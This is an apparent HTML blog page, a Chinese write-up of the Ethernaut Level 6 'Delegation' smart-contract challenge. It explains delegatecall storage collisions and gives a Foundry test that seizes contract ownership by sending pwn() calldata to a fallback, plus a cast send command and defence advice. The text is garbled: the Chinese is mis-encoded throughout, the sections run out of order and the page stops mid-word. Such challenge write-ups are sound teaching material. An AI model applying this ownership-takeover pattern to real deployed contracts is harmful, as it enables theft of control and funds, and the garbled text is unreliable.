å­˜å‚¨æ§½å†²çªç¤ºä¾‹\"></a>2. å­˜å‚¨æ§½å†²çªç¤ºä¾‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ å±é™©ï¼šä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">contract ProxyV1 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV1 &#123;</span><br><span class=\"line\">    uint256 public data;     // æ§½ 0 â† å†²çªï¼</span><br><span class=\"line\">    address public admin;    // æ§½ 1 â† å†²çªï¼</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šåŒ¹é…çš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">contract ProxyV2 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV2 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0 â† åŒ¹é…</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1 â† åŒ¹é…</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\"><a href=\"#3-å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\" class=\"headerlink\" title=\"3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\"></a>3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateSelector() public pure returns (bytes4) &#123;</span><br><span class=\"line\">    // æ–¹æ³• 1ï¼šç›´æ¥è®¡ç®—</span><br><span class=\"line\">    bytes4 selector1 = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 2ï¼šä½¿ç”¨ abi.encodeWithSignature</span><br><span class=\"line\">    bytes memory data = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">    bytes4 selector2 = bytes4(data);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 3ï¼šä½¿ç”¨ this.functionName.selector</span><br><span class=\"line\">    // bytes4 selector3 = this.pwn.selector; // å¦‚æœå‡½æ•°å­˜åœ¨</span><br><span class=\"line\">    </span><br><span class=\"line\">    return selector1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å®é™…åº”ç”¨åœºæ™¯\"><a href=\"#ğŸ›ï¸-å®é™…åº”ç”¨åœºæ™¯\" class=\"headerlink\" title=\"ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯\"></a>ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯</h2><h3 id=\"ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\"><a href=\"#ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\" class=\"headerlink\" title=\"ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\"></a>ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨</h3><ol>\n<li><p><strong>å‡çº§æ¨¡å¼</strong>ï¼š</p>\n<ul>\n<li>UUPS (Universal Upgradeable Proxy Standard)</li>\n<li>Transparent Proxy Pattern</li>\n<li>Beacon Proxy Pattern</li>\n</ul>\n</li>\n<li><p><strong>é’»çŸ³æ¨¡å¼</strong> (EIP-2535)ï¼š</p>\n<ul>\n<li>å¤šé¢åˆ‡å‰²åˆçº¦</li>\n<li>åŠŸèƒ½æ¨¡å—åŒ–</li>\n</ul>\n</li>\n<li><p><strong>æœ€å°ä»£ç†</strong> (EIP-1167)ï¼š</p>\n<ul>\n<li>Clone Factory Pattern</li>\n<li>èŠ‚çœéƒ¨ç½²æˆæœ¬</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Delegation å…³å¡æ­ç¤ºäº† <code>delegatecall</code> çš„åŒåˆƒå‰‘ç‰¹æ€§ï¼š</p>\n<ul>\n<li>âœ… <strong>ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢æœºåˆ¶</strong> - ä»£ç åœ¨ä¸åŒå­˜å‚¨ç©ºé—´æ‰§è¡Œ</li>\n<li>âœ… <strong>æŒæ¡å­˜å‚¨æ§½å¸ƒå±€åŒ¹é…</strong> - ä»£ç†å’Œå®ç°å¿…é¡»ä¸€è‡´</li>\n<li>âœ… <strong>å­¦ä¹ å®‰å…¨ä»£ç†æ¨¡å¼</strong> - ä½¿ç”¨æ ‡å‡†åŒ–è§£å†³æ–¹æ¡ˆ</li>\n<li>âœ… <strong>è®¤è¯†å‡½æ•°é€‰æ‹©å™¨å®‰å…¨</strong> - æ§åˆ¶å¯è°ƒç”¨çš„å‡½æ•°</li>\n</ul>\n<p><code>delegatecall</code> æ˜¯å®ç°åˆçº¦å‡çº§å’Œæ¨¡å—åŒ–çš„é‡è¦å·¥å…·ï¼Œä½†ä¹Ÿæ˜¯è®¸å¤šå®‰å…¨æ¼æ´çš„æ ¹æºã€‚ç†è§£å…¶å·¥ä½œåŸç†å¯¹äºæ„å»ºå®‰å…¨çš„å¯å‡çº§åˆçº¦è‡³å…³é‡è¦ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">ä¸Šä¸€å…³: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">ä¸‹ä¸€å…³: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/4.x/api/proxy\">OpenZeppelin ä»£ç†æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://eips.ethereum.org/EIPS/eip-1967\">EIP-1967: Standard Proxy Storage Slots</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯ä¸€åˆ‡ã€‚</em> ğŸ”„</p>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-6-Delegation-delegatecall-å­˜å‚¨æ§½æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-6-Delegation-delegatecall-å­˜å‚¨æ§½æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/6\">Ethernaut Level 6 - Delegation</a><br><strong>æ”»å‡»ç±»å‹</strong>: delegatecall å­˜å‚¨æ§½æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†<br><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>: å­˜å‚¨ä¸Šä¸‹æ–‡åˆ‡æ¢ã€ä»£ç†æ¨¡å¼å®‰å…¨</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒéªŒå¯¹ <code>delegatecall</code> æœºåˆ¶çš„æ·±å…¥ç†è§£ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸º <code>Delegation</code> åˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢</strong> - æŒæ¡ <code>delegatecall</code> çš„å­˜å‚¨æœºåˆ¶</li>\n<li><strong>å­¦ä¹ ä»£ç†æ¨¡å¼é£é™©</strong> - äº†è§£å‡çº§æ¨¡å¼çš„å®‰å…¨éšæ‚£</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegate &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _owner) &#123;</span><br><span class=\"line\">        owner = _owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function pwn() public &#123;</span><br><span class=\"line\">        owner = msg.sender;  // ğŸ¯ ç›®æ ‡å‡½æ•°ï¼šä¼šä¿®æ”¹ owner</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegation &#123;</span><br><span class=\"line\">    address public owner;      // ğŸš¨ å­˜å‚¨æ§½ 0</span><br><span class=\"line\">    Delegate delegate;         // ğŸš¨ å­˜å‚¨æ§½ 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _delegateAddress) &#123;</span><br><span class=\"line\">        delegate = Delegate(_delegateAddress);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        // ğŸš¨ å±é™©çš„ delegatecall</span><br><span class=\"line\">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class=\"line\">        if (result) &#123;</span><br><span class=\"line\">            this;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall-vs-call\"><a href=\"#æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall-vs-call\" class=\"headerlink\" title=\"æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call\"></a>æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call</h3><table>\n<thead>\n<tr>\n<th>è°ƒç”¨æ–¹å¼</th>\n<th>æ‰§è¡Œä¸Šä¸‹æ–‡</th>\n<th>å­˜å‚¨ä¿®æ”¹</th>\n<th>msg.sender</th>\n<th>ä½¿ç”¨åœºæ™¯</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>call</strong></td>\n<td>è¢«è°ƒç”¨åˆçº¦</td>\n<td>è¢«è°ƒç”¨åˆçº¦</td>\n<td>è°ƒç”¨åˆçº¦åœ°å€</td>\n<td>æ™®é€šå¤–éƒ¨è°ƒç”¨</td>\n</tr>\n<tr>\n<td><strong>delegatecall</strong></td>\n<td>è°ƒç”¨åˆçº¦</td>\n<td>è°ƒç”¨åˆçº¦</td>\n<td>åŸå§‹è°ƒç”¨è€…</td>\n<td>ä»£ç†æ¨¡å¼ã€å‡çº§</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ¼æ´åŸç†\"><a href=\"#æ¼æ´åŸç†\" class=\"headerlink\" title=\"æ¼æ´åŸç†\"></a>æ¼æ´åŸç†</h3><p><strong>delegatecall çš„å·¥ä½œæœºåˆ¶</strong>ï¼š</p>\n<ul>\n<li>æ‰§è¡Œ<strong>è¢«è°ƒç”¨åˆçº¦çš„ä»£ç </strong></li>\n<li>ä½¿ç”¨<strong>è°ƒç”¨åˆçº¦çš„å­˜å‚¨</strong></li>\n<li>ä¿æŒ<strong>åŸå§‹çš„ msg.sender</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å½“ Delegation åˆçº¦æ‰§è¡Œ delegatecall æ—¶ï¼š</span><br><span class=\"line\">delegate.delegatecall(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">// å®é™…æ‰§è¡Œï¼š</span><br><span class=\"line\">// 1. è¿è¡Œ Delegate.pwn() çš„ä»£ç </span><br><span class=\"line\">// 2. ä½†æ˜¯åœ¨ Delegation åˆçº¦çš„å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­</span><br><span class=\"line\">// 3. owner = msg.sender; ä¿®æ”¹çš„æ˜¯ Delegation.owner (å­˜å‚¨æ§½0)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\"><a href=\"#å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\"></a>å­˜å‚¨æ§½å¸ƒå±€åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Delegate åˆçº¦å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">// æ§½ 0: address owner</span><br><span class=\"line\"></span><br><span class=\"line\">// Delegation åˆçº¦å­˜å‚¨å¸ƒå±€  </span><br><span class=\"line\">// æ§½ 0: address owner     â† è¿™ä¸ªä¼šè¢« delegatecall ä¿®æ”¹ï¼</span><br><span class=\"line\">// æ§½ 1: Delegate delegate</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»è·¯å¾„\"><a href=\"#æ”»å‡»è·¯å¾„\" class=\"headerlink\" title=\"æ”»å‡»è·¯å¾„\"></a>æ”»å‡»è·¯å¾„</h3><ol>\n<li><strong>æ„é€ å‡½æ•°è°ƒç”¨æ•°æ®</strong> - ç¼–ç  <code>pwn()</code> å‡½æ•°é€‰æ‹©å™¨</li>\n<li><strong>è§¦å‘ fallback å‡½æ•°</strong> - å‘åˆçº¦å‘é€å¸¦æ•°æ®çš„äº¤æ˜“</li>\n<li><strong>æ‰§è¡Œ delegatecall</strong> - åœ¨ Delegation å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ <code>pwn()</code></li>\n<li><strong>è·å¾—æ§åˆ¶æƒ</strong> - <code>owner</code> è¢«è®¾ç½®ä¸ºæ”»å‡»è€…åœ°å€</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Delegation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DelegationTest is Test &#123;</span><br><span class=\"line\">    Delegate public delegate;</span><br><span class=\"line\">    Delegation public delegation;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public deployer = makeAddr(&quot;deployer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        vm.startPrank(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Delegate åˆçº¦</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Delegation åˆçº¦</span><br><span class=\"line\">        delegation = new Delegation(address(delegate));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDelegationExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šæ„é€  pwn() å‡½æ•°è°ƒç”¨</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ fallback å‡½æ•°è§¦å‘ delegatecall</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(delegation.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attack successful!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderstandDelegatecall() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== Before Attack ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç›´æ¥è°ƒç”¨ delegate.pwn() åªä¼šä¿®æ”¹ delegate çš„å­˜å‚¨</span><br><span class=\"line\">        delegate.pwn();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After direct call to Delegate.pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // ä¸å˜</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // å˜ä¸º attacker</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é‡ç½®çŠ¶æ€</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        vm.prank(deployer);</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // é€šè¿‡ delegatecall è°ƒç”¨ pwn()</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After delegatecall to pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // å˜ä¸º attacker!</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // ä¸å˜</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testFunctionSelector() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºå‡½æ•°é€‰æ‹©å™¨çš„è®¡ç®—</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.log(&quot;pwn() selector:&quot;);</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bytes memory encoded = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        console.log(&quot;Encoded call data:&quot;);</span><br><span class=\"line\">        console.logBytes(encoded);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ‰‹åŠ¨æ”»å‡»è„šæœ¬\"><a href=\"#æ‰‹åŠ¨æ”»å‡»è„šæœ¬\" class=\"headerlink\" title=\"æ‰‹åŠ¨æ”»å‡»è„šæœ¬\"></a>æ‰‹åŠ¨æ”»å‡»è„šæœ¬</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å¦‚æœéœ€è¦æ‰‹åŠ¨æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ cast å‘½ä»¤</span><br><span class=\"line\">contract ManualAttack is Test &#123;</span><br><span class=\"line\">    function testManualAttack() public &#123;</span><br><span class=\"line\">        // 1. è®¡ç®—å‡½æ•°é€‰æ‹©å™¨</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. ä½¿ç”¨ cast å‘é€äº¤æ˜“</span><br><span class=\"line\">        // cast send &lt;DELEGATION_ADDRESS&gt; &lt;SELECTOR&gt; --private-key &lt;YOUR_KEY&gt;</span><br><span class=\"line\">        // ä¾‹å¦‚ï¼šcast send 0x... 0xdd365b8b --private-key ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Delegation æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract DelegationTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># Initial owner: 0x... (deployer)</span></span><br><span class=\"line\"><span class=\"comment\"># Attacker address: 0x... (attacker) </span></span><br><span class=\"line\"><span class=\"comment\"># New owner: 0x... (attacker)</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful!</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\"><a href=\"#1-ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\" class=\"headerlink\" title=\"1. ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\"></a>1. ä¸¥æ 